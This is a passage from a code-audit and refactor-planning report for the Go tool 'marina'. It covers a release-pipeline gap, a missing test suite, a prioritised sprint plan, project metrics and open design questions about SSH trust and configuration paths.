### Theme 3: Actions-layer completion — ~80% done, 3 paths remain
The `internal/actions/` engine is load-bearing and well-used. Only three paths still hold inline business logic: the TUI purge sequence (P1-1), the CLI update orchestration (P1-2), and the CLI/TUI registry check asymmetry (P1-3). Finishing the migration makes "no drift, no surprises" structurally true and reduces `commands/updates.go` from 585 LOC to ~80 LOC of cobra wiring.

### Theme 4: Release pipeline is entirely unguarded
Six CI gaps (P1-17) collectively mean: any commit on `main` ships unverified; release binaries are not reproducible; no user can verify a download's integrity; Windows and macOS are never tested despite being declared targets. The entire `P1-17` cluster can be fixed in one PR (a `ci.yml` + patched `release.yml` + `SHA256SUMS` step) before any code changes.

### Theme 5: Test vacuum amplifies every other finding
Zero tests mean that fixing P0-1, P1-2, or any concurrency finding cannot be verified by CI. The suggested staged testing strategy (registry → discovery → config → ssh → actions fan-out → CLI golden → TUI teatest) pairs naturally with the fix order in the refactor sequence below.

---

## Proposed Refactor Sequence

```
Sprint 1 — Safety (unblock scripted use; stop data loss)
  1. Fix state.json atomic write + merge after fan-out (P0-1) — S
  2. Aggregate update/prune errors + non-zero exit (P0-3) — M
  3. Add hardening flags to connhelper sshFlags (P0-2, fast path) — S
  4. Thread s.ctx through ComposeExecCmd/rawExec (P1-7) — S
  5. Tilde-expand SSH key paths in config.Load (P1-10) — S
  6. Add CI workflow + fix release pipeline gaps A-F (P1-17) — S×6

Sprint 2 — Engine completion (make "no drift" structurally true)
  7. Move update apply orchestration into actions/updates.go (P1-2) — M
  8. Drive TUI purge from actions.PurgePlan (P1-1) — M
  9. Lift BuildChecker→fan-out→SaveCache into actions/checks.go (P1-3) — M
  10. Extract resolveTargets helper in commands/helpers.go (P1-4) — S
  11. Delete CLI pruneCommand + shellQuote duplicate (P1-5, P1-6) — S

Sprint 3 — Reliability + observability
  12. Fix BuildChecker fail-closed (P1-8) — S
  13. Add --debug flag + per-host fetch timing (P1-15) + fetchOneHost slog (P1-15 sub) — M
  14. Add TUI dashboard.Update panic recovery (P1-14) — S
  15. Add registry HTTP transport with timeouts (P1-9) — S
  16. Fix ComposeOp shell quoting + Gotify https enforcement (P1-12, P1-13) — S
  17. Bound runChecks fan-out with errgroup.SetLimit (P2-2) — S

Quarter backlog (in any order after the above)
  18. Write tests: registry → discovery → config → ssh → actions → CLI golden (P1-16) — staged L
  19. os.UserConfigDir() migration (P2-8) — M
  20. Windows SSH agent named-pipe fallback (P2-7) — M
  21. Kill dead cache.go on-disk half (P2-3) — S
  22. updatesScreen O(N²) → rebuildVisible (P2-4) — S
  23. Fan-out helper + context-cancel during range ch (P2-6) — M
  24. .golangci.yml + SHA-pin GitHub Actions (P2-9, P2-10) — S
  25. P3 polish: slices.SortFunc, firstLine consolidation, sentinels, etc. — S batch
```

---

## Metrics Snapshot

| Metric | Value |
|--------|-------|
| Module | `github.com/AhmedAburady/marina` |
| Go version (go.mod) | 1.26.2 |
| Total LOC (excl. `.agents/`) | ~8,724 |
| `go build ./...` | ✅ clean |
| `go vet ./...` | ✅ clean |
| `go mod tidy -diff` | ✅ clean |
| Test files | 0 |
| Test coverage | 0% |
| `.golangci.yml` | absent |
| Race detector | not run (no tests) |
| CI on push/PR | absent |
| P0 findings | 3 |
| P1 findings | 17 (incl. 6-sub cluster) |
| P2 findings | 13 |
| P3 findings | 12 |
| **Total deduped findings** | **45** |

---

## Open Questions

1. **Is `connhelper` load-bearing beyond SSH transport?** (e.g., `docker context` integration, multi-arch manifest support). If yes, adding hardening flags (P0-2 fast path) is the only near-term option; if no, replacing it with `internal/ssh` + `docker system dial-stdio` makes the `known_hosts` guarantee structurally true.

2. **What is the actual trust model for the `connhelper` path?** Does Marina assume operators run it from a trusted workstation where `~/.ssh/config` is canonical? If yes, P0-2 can be documented as a known limitation rather than an architectural fix — but this must be explicit, not implicit.

3. **Is the Gotify integration expected to work on loopback / tailnet only?** If yes, P1-13 (Gotify `http://`) is a P2 with a documentation fix rather than an enforcement change.

4. **Should `update --all --yes` fail-fast or collect-all?** P0-3 proposes collecting all failures; some users may prefer fail-fast (first error stops the loop) for atomic rollout semantics. Needs a decision before `--keep-going` flag design.

5. **Is there a migration window for `os.UserConfigDir()`?** (P2-8) Linux users who already have `~/.config/marina/` would need a transparent migration. Decide how many releases to support the old path before removing the back-compat fallback.

6. **Test strategy for TUI screens**: should Marina adopt `teatest` (in-process, `charm.land/bubbletea/v2/teatest`) or integration-test via the CLI? The former is richer but requires the Bubble Tea v2 test harness; the latter is simpler but can only validate rendered output, not state machine transitions.
